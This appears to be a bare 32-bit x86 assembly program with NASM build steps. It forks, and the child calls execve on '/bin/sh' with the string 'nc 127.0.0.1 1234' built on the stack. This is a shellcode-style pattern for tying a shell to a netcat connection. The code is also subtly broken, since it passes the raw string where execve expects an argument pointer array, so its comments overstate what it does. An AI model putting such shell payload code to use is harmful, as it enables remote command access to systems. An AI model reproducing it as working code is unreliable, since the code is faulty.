; fork_and_go.asm (32-bit x86)
; Build:  nasm -f elf32 fork_and_go.asm -o fork_and_go.o
;         ld -m elf_i386 fork_and_go.o -o fork_and_go

global _start

section .text

_start:

    ; fork
    mov     eax, 2              
    int     0x80

    test    eax, eax            
    jz      child              

parent:

    ; could place logic here to gracefully continue
    ; exit(0)
    mov     eax, 1              
    xor     ebx, ebx            
    int     0x80

child:

    push    0x0068732f          ; "/sh\0"
    push    0x6e69622f          ; "/bin"
    mov     ebx, esp            ; save into ebx addr to reference "/bin/sh"

    push    0x00000034          ; "4\0\0\0"
    push    0x33323120          ; " 123"
    push    0x312e302e          ; ".0.1"
    push    0x302e3732          ; "27.0"
    push    0x3120636e          ; "nc 1"
    mov     ecx, esp            ; save into ecx addr to reference "nc 127.0.0.1 1234"

    push    0                   ; null
    mov     edx, esp            ; save into edx addr to referenceNULL

    ; execve
    mov     eax, 11             ; SYS_execve
    int     0x80

    ; exit(0)
    mov     eax, 1              
    xor     ebx, ebx            
    int     0x80
